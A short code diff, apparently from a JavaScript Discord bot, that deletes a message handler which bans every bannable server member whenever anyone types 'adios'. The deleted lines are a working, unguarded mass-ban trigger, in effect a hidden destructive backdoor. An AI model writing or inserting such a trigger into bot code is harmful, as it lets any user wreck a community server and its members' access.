@@ -67,9 +67,5 @@ if (message.author.id !== '342329902936358912') return;
   message.react("🗿");
 });
 
-client.on('message', message => {
-  if(message.content === 'adios')
-   message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()}); 
-  }
-);
+
 
